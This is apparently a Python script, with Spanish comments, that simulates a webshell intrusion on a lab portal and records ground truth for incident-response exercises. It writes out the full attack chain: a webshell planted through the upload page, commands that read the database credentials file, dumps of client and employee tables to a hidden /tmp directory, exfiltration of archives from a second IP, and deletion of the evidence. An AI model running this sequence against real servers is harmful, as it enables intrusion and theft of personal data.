"""Secuencia del INCIDENTE simulado (comportamiento tipo PHP2Shell, CVE-2026-109618).

Fases (hora de Colombia, por defecto viernes 2026-11-06 de madrugada):
  1. Reconocimiento  — navegación, robots.txt y enumeración de rutas (gobuster).
  2. Explotación     — ráfaga de POST multipart a /empleados/foto.php (la página real de
 *                       subir foto de perfil) con el campo PHP_SESSION_UPLOAD_PROGRESS
                       hasta que "aparece" la webshell en /uploads/avatars/.
  3. Post-explotación — órdenes de reconocimiento a través de la webshell (en Base64).
  4. Escalada y consulta masiva — lee config/database.php, usa la cuenta techcorp_admin y
                       vuelca las tablas clientes y empleados a /tmp/.d/.
  5. Exfiltración    — comprime los volcados y el docroot y los descarga desde OTRA IP.
  6. Limpieza        — borra los archivos temporales (la webshell queda como persistencia).

Nada de esto ataca un sistema real: el portal reconoce el patrón en modo laboratorio y
responde con un simulador (ver portal/lab/). Las IP son de rangos reservados para
documentación (RFC 5737).
"""
from __future__ import annotations

import base64
import random
import re
import string
from datetime import datetime, timedelta
from urllib.parse import quote

from comun import COL
from http_sim import Http
from trafico import lista_rutas

IP_ATACANTE = "203.0.113.66"
IP_EXFIL = "203.0.113.67"
UA_NAVEGADOR = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
UA_GOBUSTER = "gobuster/3.6"
UA_HERRAMIENTA = "python-requests/2.32.3"
UA_EXFIL = "curl/8.5.0"
WEBSHELL = "/uploads/avatars/thumb_8f3a.php"


def b64(s: str) -> str:
    return quote(base64.b64encode(s.encode()).decode(), safe="")


def ejecutar(t0: datetime, semilla: int) -> dict:
    r = random.Random(semilla)
    verdad: dict = {"ip_origen": IP_ATACANTE, "ip_exfiltracion": IP_EXFIL, "webshell": WEBSHELL, "fases": {}, "ordenes": []}

    def fase(nombre: str, ini: datetime, fin: datetime) -> None:
        verdad["fases"][nombre] = {"inicio_local": ini.astimezone(COL).isoformat(timespec="seconds"),
                                   "fin_local": fin.astimezone(COL).isoformat(timespec="seconds")}

    nav = Http(IP_ATACANTE, UA_NAVEGADOR)
    gob = Http(IP_ATACANTE, UA_GOBUSTER)
    tool = Http(IP_ATACANTE, UA_HERRAMIENTA)
    exf = Http(IP_EXFIL, UA_EXFIL)
    try:
        # ---------------------------------------------------- 1. reconocimiento
        t = t0
        ini = t
        nav.navegar("/", t)
        for a in ["/assets/css/portal.css", "/assets/js/portal.js", "/assets/img/logo.svg", "/favicon.ico"]:
            t += timedelta(milliseconds=r.randint(30, 120))
            nav.get(a, t, referer="/login.php")
        t += timedelta(seconds=r.uniform(20, 40))
        nav.get("/robots.txt", t)
        t += timedelta(seconds=r.uniform(50, 80))
        for p in lista_rutas(r, 380) + ["/uploads/avatars/", "/legacy/status.php", "/api/health.php", "/empleados/foto.php"]:
            t += timedelta(milliseconds=r.randint(40, 140))  # gobuster: ~10 peticiones por segundo
            gob.get(p, t)
        t += timedelta(minutes=r.uniform(3, 5))
        tool.get("/empleados/foto.php", t)  # huella de versión: X-Powered-By: PHP/8.3.30
        fase("1_reconocimiento", ini, t)

        # ------------------------------------------------------- 2. explotación
        t += timedelta(minutes=r.uniform(4, 6))
        ini = t
        intentos, exito_ts = 0, None
        for i in range(1, 80):
            intentos = i
            sid = "".join(r.choices(string.ascii_lowercase + string.digits, k=26))
            relleno = r.randbytes(r.randint(300_000, 900_000))
            resp = tool.post("/empleados/foto.php", t,
                             data={"PHP_SESSION_UPLOAD_PROGRESS": "".join(r.choices(string.ascii_letters, k=48))},
                             files={"foto": ("perfil.jpg", relleno, "image/jpeg")},
                             cookies={"PHPSESSID": sid})
            t += timedelta(seconds=r.uniform(1.5, 3.5))
            if resp.status_code != 500 or i % 4 == 0:
                chk = tool.get(WEBSHELL, t)
                t += timedelta(seconds=r.uniform(0.5, 1.5))
                if chk.status_code == 200:
                    exito_ts = t
                    break
            t += timedelta(seconds=r.uniform(8, 16))
        verdad["intentos_explotacion"] = intentos
        if exito_ts is None:
            raise RuntimeError("La explotación simulada no produjo la webshell (¿ya existía un incidente?)")
        fase("2_explotacion", ini, exito_ts)

        # -------------------------------------------- 3. post-explotación
        def orden(cmd: str, h: Http = tool, espera: tuple[float, float] = (12, 45)) -> str:
            nonlocal t
            t += timedelta(seconds=r.uniform(*espera))
            resp = h.get(f"{WEBSHELL}?x={b64(cmd)}", t)
            verdad["ordenes"].append({"hora_local": t.astimezone(COL).isoformat(timespec="seconds"), "orden": cmd,
                                      "estado": resp.status_code, "bytes": len(resp.content)})
            return resp.text

        ini = t
        for cmd in ["id", "whoami", "uname -a", "pwd", "php -v", "ls -la /var/www/html", "ls -la /var/www/html/config"]:
            orden(cmd)
        config = orden("cat /var/www/html/config/database.php")
        fase("3_post_explotacion", ini, t)

        # -------------------------------- 4. escalada y consulta masiva a la BD
        m = re.search(r"'admin'\s*=>\s*\['user' => '([^']+)', 'pass' => '([^']*)'\]", config)
        if not m:
            raise RuntimeError("No se pudieron leer las credenciales simuladas del archivo de configuración")
        usuario, clave = m.group(1), m.group(2)
        mysql = f"mysql -h db -u {usuario} -p'{clave}' techcorp -e"
        ini = t
        t += timedelta(minutes=r.uniform(1, 2))
        orden(f'{mysql} "SHOW TABLES"')
        orden(f'{mysql} "SELECT COUNT(*) FROM clientes"')
        orden(f'{mysql} "SELECT COUNT(*) FROM empleados"')
        orden("mkdir -p /tmp/.d")
        for off in range(0, 2000, 500):
            orden(f'{mysql} "SELECT * FROM clientes ORDER BY id LIMIT 500 OFFSET {off}" > /tmp/.d/clientes_{off // 500}.tsv', espera=(25, 70))
        orden(f'{mysql} "SELECT * FROM empleados ORDER BY id" > /tmp/.d/empleados.tsv', espera=(25, 70))
        orden("ls -la /tmp/.d")
        fase("4_escalada_y_consulta_masiva", ini, t)
        verdad["cuenta_bd_usada"] = usuario
        verdad["tablas_volcadas"] = {"clientes": "SELECT * ORDER BY id en 4 bloques de 500", "empleados": "SELECT * (incluye salario y password_hash)"}

        # ----------------------------------------------------- 5. exfiltración
        ini = t
        orden("tar czf /tmp/.d.tgz -C /tmp .d", espera=(60, 120))
        orden("tar czf /tmp/.w.tgz /var/www/html", espera=(20, 40))
        orden("du -sh /tmp/.d.tgz /tmp/.w.tgz")
        descargas = []
        for ruta in ["/tmp/.d.tgz", "/tmp/.w.tgz"]:
            t += timedelta(seconds=r.uniform(40, 90))
            resp = exf.get(f"{WEBSHELL}?dl={b64(ruta)}", t)
            descargas.append({"hora_local": t.astimezone(COL).isoformat(timespec="seconds"), "archivo": ruta,
                              "ip": IP_EXFIL, "estado": resp.status_code, "bytes": len(resp.content)})
            t += timedelta(seconds=len(resp.content) / 1_500_000)  # la descarga "dura" a ~1,5 MB/s
        verdad["descargas"] = descargas
        verdad["bytes_exfiltrados"] = sum(d["bytes"] for d in descargas)
        fase("5_exfiltracion", ini, t)

        # -------------------------------------------------------- 6. limpieza
        ini = t
        orden("rm -rf /tmp/.d /tmp/.d.tgz /tmp/.w.tgz", espera=(120, 240))
        orden("ls -la /tmp/.d")
        fase("6_limpieza", ini, t)
        verdad["fin_local"] = t.astimezone(COL).isoformat(timespec="seconds")
    finally:
        for h in (nav, gob, tool, exf):
            h.cerrar()
    return verdad
